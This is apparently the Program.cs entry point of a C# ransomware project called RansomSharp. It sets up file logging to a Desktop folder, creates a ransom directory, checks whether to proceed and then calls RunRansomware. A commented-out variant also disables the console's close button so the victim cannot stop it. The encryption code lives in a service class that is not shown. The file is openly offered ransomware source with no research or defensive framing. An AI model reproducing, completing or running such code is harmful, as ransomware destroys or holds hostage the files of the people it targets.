////using RansomSharp.Core.Console;
//using RansomSharp.Core.Service;

////ConsoleCloserDisabler.DisableCloseButton();

//var ransomService = new RansomService();
//string ransomDir = ransomService.CreateRansomDirectory();

//if (ransomService.ShouldContinueRansomware())
//    await ransomService.RunRansomware(ransomDir);

using RansomSharp.Core.Service;
using Serilog;

string logsDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "RansomLogs");
if (!Directory.Exists(logsDirectory))
    Directory.CreateDirectory(logsDirectory);

Log.Logger = new LoggerConfiguration()
    .WriteTo.File(Path.Combine(logsDirectory, $"FileLoG{DateTime.Now.ToString("MM-dd-yy_HH-mm")}.log"))
    .CreateLogger();

var ransomService = new RansomService();

string ransomDir = ransomService.CreateRansomDirectory();

if (ransomService.ShouldContinueRansomware())
{
    try
    {
        ransomService.RunRansomware(ransomDir).Wait();
    }
    catch (Exception ex)
    {
        Log.Error(ex, "An error occurred during the initialization of RansomSharp Log.");
    }
}

Log.CloseAndFlush();